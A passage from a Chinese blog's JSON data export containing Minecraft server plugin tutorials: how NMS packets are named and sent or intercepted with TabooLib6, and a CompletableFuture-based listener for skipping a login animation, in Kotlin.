title=\"数据包的命名规则\"></a>数据包的命名规则</h3><p>每一种数据包都是NMS底层的一个类，他们的位置都在net.minecraft.server.&lt;版本号&gt;这个包下</p>\n<p>我们来拆分一下PacketPlayOutUpdateHealth这个数据包的名称</p>\n<p>Packet(Play)(Out)(UpdateHealth)</p>\n<p>Play: 数据包的发送的四种状态之一 （HandShake, Status, Login, Play）</p>\n<p>Out: Out&#x2F;In -&gt; Out即为服务端向客户端发送的数据包，In则相反</p>\n<p>UpdateHealth: 这个数据包的作用，这里是指更新玩家客户端的健康状态</p>\n<p>由此我们便大致可以猜测数据包的作用</p>\n<p>当然，如果你不是很确定的话，还是查查<a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a>吧</p>\n<h3 id=\"数据包字段\"><a href=\"#数据包字段\" class=\"headerlink\" title=\"数据包字段\"></a>数据包字段</h3><p>在我们通过反编译查看数据包类的内容时，一般我们会发现一些字段。这些字段的字段名一般都是a，b，c之类的字母，我们无法从字段名中推测这个字段的值代表的东西。</p>\n<p>而无论是发包还是修改数据包，我们都必须理解这个数据包的字段所代表的意义才行。</p>\n<p><a href=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\"><img src=\"https://camo.githubusercontent.com/97fa12ece9deff1a46bd47da6b99a25e982091f1c2b4e46c7ff3526620ceb9f3/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343134383538362e706e67\" alt=\"image-20210928084148586\"></a></p>\n<p>一般这种情况下，我们会查阅<a href=\"https://wiki.vg/Protocol#Interact_Entity\">Protocol - wiki.vg</a></p>\n<p><a href=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\"><img src=\"https://camo.githubusercontent.com/dc70d6784e1e59e2a5423b583c9ef90dae6f59ff3db7246d579aa3f45a1aa40b/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f696d6167652d32303231303932383038343434393734342e706e67\" alt=\"image-20210928084449744\"></a></p>\n<p>于是通过查询wiki，我们基本确定了数据包中字段代表的意义 a -&gt; 生命值 b -&gt; 饱食度 c -&gt; 食物饱和度</p>\n<p>请注意，<strong>少数时候反编译出来的字段并不按wiki中表格的顺序排列</strong>（例如PacketPlayOutExperience），你需要结合字段类型来判断字段在wiki上对应的字段</p>\n<p>有时多个字段类型一样，千万要多试。</p>\n<p>虽然wiki是个很方便的东西，但wiki上也不是什么都有的。事实上，有很多数据包的字段，还有一些DataWatcher之类的杂七杂八的东西没有被wiki标注字段名称和Notes。这时候我们不能怕困难，怼着NMS代码啃就完事了！</p>\n<p>Tips: 有针对性的去寻找NMS代码，从跟你想要实现的功能有一定关系的BukkitAPI方法入手，顺藤摸瓜草到CraftBukkit再溯源到NMS</p>\n<h3 id=\"使用TabooLib6发送-x2F-修改-x2F-拦截数据包\"><a href=\"#使用TabooLib6发送-x2F-修改-x2F-拦截数据包\" class=\"headerlink\" title=\"使用TabooLib6发送&#x2F;修改&#x2F;拦截数据包\"></a>使用TabooLib6发送&#x2F;修改&#x2F;拦截数据包</h3><h4 id=\"发送\"><a href=\"#发送\" class=\"headerlink\" title=\"发送\"></a>发送</h4><p>使用TabooLib的牛逼NMS版本控制工具，直接写NMS代码来发送数据包</p>\n<p><strong>接口部分</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">interface</span> NMS <span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token comment\">/**\n     * 刷新饱食度条\n     *\n     * @param p 玩家\n     */</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">companion</span> <span class=\"token keyword\">object</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// 经过版本控制的实例，可以在任意版本放心使用</span>\n        <span class=\"token comment\">// 在同一个包下创建一个实现类，取名为&lt;接口名>Impl即可</span>\n        <span class=\"token keyword\">val</span> handle <span class=\"token keyword\">by</span> lazy <span class=\"token punctuation\">&#123;</span>\n            nmsProxy<span class=\"token operator\">&lt;</span>NMS<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>实现部分</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> NMSImpl <span class=\"token operator\">:</span> NMS <span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token comment\">// 没错，直接用nms，不用担心版本的问题</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">updateFoodBar</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> foodData <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p <span class=\"token keyword\">as</span> CraftPlayer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>foodData\n        p<span class=\"token punctuation\">.</span>handle<span class=\"token punctuation\">.</span>playerConnection<span class=\"token punctuation\">.</span><span class=\"token function\">sendPacket</span><span class=\"token punctuation\">(</span><span class=\"token function\">PacketPlayOutUpdateHealth</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>scaledHealth<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>foodLevel<span class=\"token punctuation\">,</span> foodData<span class=\"token punctuation\">.</span>saturationLevel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"拦截-x2F-修改\"><a href=\"#拦截-x2F-修改\" class=\"headerlink\" title=\"拦截&#x2F;修改\"></a>拦截&#x2F;修改</h4><p>TabooLib6将服务器数据包通讯包装为了两个事件，我们直接通过监听这个事件即可实现数据包的拦截与修改</p>\n<p>监听名称中含有Out这个单词的数据包就用PacketSendEvent，In就用PacketReceiveEvent</p>\n<p>接下来我给段实例代码，自己去悟吧</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@SubscribeEvent</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PacketSendEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token comment\">// 对数据包类型的判断</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>name <span class=\"token operator\">==</span> <span class=\"token string\">\"PacketPlayOutExperience\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> v <span class=\"token operator\">=</span> expTempValue<span class=\"token punctuation\">[</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span>\n        <span class=\"token comment\">// 读取数据包中字段的值</span>\n        <span class=\"token keyword\">val</span> level <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span>read<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// 将值写入数据包中的字段</span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> v <span class=\"token operator\">?:</span> <span class=\"token number\">0.0f</span><span class=\"token punctuation\">)</span>\n        e<span class=\"token punctuation\">.</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// 取消事件，意思是直接把这个数据包拦截下来了</span>\n        e<span class=\"token punctuation\">.</span>isCancelled <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"初试CompletableFuture","date":"2021-08-28T05:21:28.000Z","author":"寒雨","hide":false,"summary":"初次尝试java的CompletableFuture","_content":"\n这个东西其实是在看了海螺大佬的博客([如何问玩家“吾与徐公孰美？” | IzzelAliz's Blog](https://izzel.io/2020/02/12/chat-with-future/))后才了解的，但在今天之前我其实一直只是在用它的回调函数来确保某些操作在一些耗时动作执行完后执行。\n\n直到昨天为了做一个玩家按键跳过登入动画的功能，我又去看了这篇文章。不得不说，**海螺是真的牛逼**\n\n## 代码\n\n按照海螺在他博客里提供的思路，我照猫画虎整了一个监听玩家按键的功能。\n\n在需要与玩家交流时注册一个监听器，交流完或者超时时关闭这个想法真的牛逼。我真想不到\n\n**监听器类**\n\n```kotlin\nclass AskSkipOrNot(private val uuid: UUID,\n                   private val future: CompletableFuture<Boolean>) : Listener {\n\n    @EventHandler\n    fun e(e: PlayerInteractEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"RIGHT\"\n            && e.action == Action.RIGHT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"LEFT\"\n            && e.action == Action.LEFT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n\n    @EventHandler\n    fun e(e: PlayerSwapHandItemsEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"F\") {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n}\n```\n\n**功能**\n\n```kotlin\n    // 展示登录动画\n    fun toIconDisplayAnimation(player: Player, func: () -> Unit = { }) {\n        player.setMetadata(\"SacredAuth:icon-display\", FixedMetadataValue(SacredAuth.plugin, true))\n        val future = CompletableFuture<Boolean>()\n        val time = conf.getLong(\"auth.display.time\")\n        KetherShell.eval(conf.getString(\"auth.display.script.display\")!!) {\n            sender = player\n        }\n        // 方法\n        fun end() {\n            player.removeMetadata(\"SacredAuth:icon-display\", SacredAuth.plugin)\n            KetherShell.eval(conf.getString(\"auth.display.script.after-display\")!!) {\n                sender = player\n            }\n        }\n        future.thenRun {\n            end()\n            func.invoke()\n        }\n        val listener = AskSkipOrNot(player.uniqueId, future)\n        Bukkit.getPluginManager().registerEvents(listener, SacredAuth.plugin)\n        Tasks.task(true) {\n            try {\n                future.get(time * 50L, TimeUnit.MILLISECONDS)\n            } catch (ignored: TimeoutException) {\n                // 这里貌似future已经被中断了，因为超时了，所以future即使complete也不会执行他的回调函数\n                // future.complete(true)\n                end()\n                func.invoke()\n            }\n        }\n    }\n```\n\n","source":"_posts/try-completablefuture.md","raw":"---\ntitle: 初试CompletableFuture\ndate: 2021-08-28 13:21:28\nauthor: 寒雨\nhide: false\nsummary: 初次尝试java的CompletableFuture\ncategories: 笔记\ntags:\n  - Kotlin\n  - Java\n---\n\n这个东西其实是在看了海螺大佬的博客([如何问玩家“吾与徐公孰美？” | IzzelAliz's Blog](https://izzel.io/2020/02/12/chat-with-future/))后才了解的，但在今天之前我其实一直只是在用它的回调函数来确保某些操作在一些耗时动作执行完后执行。\n\n直到昨天为了做一个玩家按键跳过登入动画的功能，我又去看了这篇文章。不得不说，**海螺是真的牛逼**\n\n## 代码\n\n按照海螺在他博客里提供的思路，我照猫画虎整了一个监听玩家按键的功能。\n\n在需要与玩家交流时注册一个监听器，交流完或者超时时关闭这个想法真的牛逼。我真想不到\n\n**监听器类**\n\n```kotlin\nclass AskSkipOrNot(private val uuid: UUID,\n                   private val future: CompletableFuture<Boolean>) : Listener {\n\n    @EventHandler\n    fun e(e: PlayerInteractEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"RIGHT\"\n            && e.action == Action.RIGHT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"LEFT\"\n            && e.action == Action.LEFT_CLICK_AIR) {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n\n    @EventHandler\n    fun e(e: PlayerSwapHandItemsEvent) {\n        if (e.player.uniqueId != uuid) return\n        if (SacredAuth.conf.getString(\"auth.display.skip-button\")?.uppercase() == \"F\") {\n            future.complete(true)\n            HandlerList.unregisterAll(this)\n        }\n    }\n}\n```\n\n**功能**\n\n```kotlin\n    // 展示登录动画\n    fun toIconDisplayAnimation(player: Player, func: () -> Unit = { }) {\n        player.setMetadata(\"SacredAuth:icon-display\", FixedMetadataValue(SacredAuth.plugin, true))\n        val future = CompletableFuture<Boolean>()\n        val time = conf.getLong(\"auth.display.time\")\n        KetherShell.eval(conf.getString(\"auth.display.script.display\")!!) {\n            sender = player\n        }\n        // 方法\n        fun end() {\n            player.removeMetadata(\"SacredAuth:icon-display\", SacredAuth.plugin)\n            KetherShell.eval(conf.getString(\"auth.display.script.after-display\")!!) {\n                sender = player\n            }\n        }\n        future.thenRun {\n            end()\n            func.invoke()\n        }\n        val listener = AskSkipOrNot(player.uniqueId, future)\n        Bukkit.getPluginManager().registerEvents(listener, SacredAuth.plugin)\n        Tasks.task(true) {\n            try {\n                future.get(time * 50L, TimeUnit.MILLISECONDS)\n            } catch (ignored: TimeoutException) {\n                // 这里貌似future已经被中断了，因为超时了，所以future即使complete也不会执行他的回调函数\n                // future.complete(true)\n                end()\n                func.invoke()\n            }\n        }\n    }\n```\n\n","slug":"try-completablefuture","published":1,"updated":"2022-12-12T15:54:04.090Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtx002nsfkl1shb8n78","content":"<p>这个东西其实是在看了海螺大佬的博客(<a href=\"https://izzel.io/2020/02/12/chat-with-future/\">如何问玩家“吾与徐公孰美？” | IzzelAliz’s Blog</a>)后才了解的，但在今天之前我其实一直只是在用它的回调函数来确保某些操作在一些耗时动作执行完后执行。</p>\n<p>直到昨天为了做一个玩家按键跳过登入动画的功能，我又去看了这篇文章。不得不说，<strong>海螺是真的牛逼</strong></p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><p>按照海螺在他博客里提供的思路，我照猫画虎整了一个监听玩家按键的功能。</p>\n<p>在需要与玩家交流时注册一个监听器，交流完或者超时时关闭这个想法真的牛逼。我真想不到</p>\n<p><strong>监听器类</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">,</span>\n                   <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> future<span class=\"token operator\">:</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> Listener <span class=\"token punctuation\">{</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerInteractEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"RIGHT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>RIGHT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"LEFT\"</span>\n            <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>action <span class=\"token operator\">==</span> Action<span class=\"token punctuation\">.</span>LEFT_CLICK_AIR<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerSwapHandItemsEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.skip-button\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">uppercase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"F\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">complete</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span>\n            HandlerList<span class=\"token punctuation\">.</span><span class=\"token function\">unregisterAll</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>功能</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 展示登录动画</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">toIconDisplayAnimation</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> func<span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span> Unit <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    player<span class=\"token punctuation\">.</span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">FixedMetadataValue</span><span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> future <span class=\"token operator\">=</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> time <span class=\"token operator\">=</span> conf<span class=\"token punctuation\">.</span><span class=\"token function\">getLong</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.time\"</span><span class=\"token punctuation\">)</span>\n    KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        sender <span class=\"token operator\">=</span> player\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">// 方法</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        player<span class=\"token punctuation\">.</span><span class=\"token function\">removeMetadata</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SacredAuth:icon-display\"</span><span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n        KetherShell<span class=\"token punctuation\">.</span><span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>conf<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"auth.display.script.after-display\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            sender <span class=\"token operator\">=</span> player\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    future<span class=\"token punctuation\">.</span><span class=\"token function\">thenRun</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">val</span> listener <span class=\"token operator\">=</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">.</span>uniqueId<span class=\"token punctuation\">,</span> future<span class=\"token punctuation\">)</span>\n    Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getPluginManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">registerEvents</span><span class=\"token punctuation\">(</span>listener<span class=\"token punctuation\">,</span> SacredAuth<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span>\n    Tasks<span class=\"token punctuation\">.</span><span class=\"token function\">task</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            future<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>time <span class=\"token operator\">*</span> <span class=\"token number\">50L</span><span class=\"token punctuation\">,</span> TimeUnit<span class=\"token punctuation\">.</span>MILLISECONDS<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>ignored<span class=\"token operator\">:</span> TimeoutException<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 这里貌似future已经被中断了，因为超时了，所以future即使complete也不会执行他的回调函数</span>\n            <span class=\"token comment\">// future.complete(true)</span>\n            <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            func<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<p>这个东西其实是在看了海螺大佬的博客(<a href=\"https://izzel.io/2020/02/12/chat-with-future/\">如何问玩家“吾与徐公孰美？” | IzzelAliz’s Blog</a>)后才了解的，但在今天之前我其实一直只是在用它的回调函数来确保某些操作在一些耗时动作执行完后执行。</p>\n<p>直到昨天为了做一个玩家按键跳过登入动画的功能，我又去看了这篇文章。不得不说，<strong>海螺是真的牛逼</strong></p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><p>按照海螺在他博客里提供的思路，我照猫画虎整了一个监听玩家按键的功能。</p>\n<p>在需要与玩家交流时注册一个监听器，交流完或者超时时关闭这个想法真的牛逼。我真想不到</p>\n<p><strong>监听器类</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">AskSkipOrNot</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">,</span>\n                   <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> future<span class=\"token operator\">:</span> CompletableFuture<span class=\"token operator\">&lt;</span>Boolean<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> Listener <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token annotation builtin\">@EventHandler</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">e</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> PlayerInteractEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>player<span class=\"token punctuation\">.</span>uniqueId <span class=\"token operator\">!=</span> uuid<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SacredAuth<span class=\"token punctuation\">.</span>conf<span class=\"token punctuation\">.</span><span class=\"token 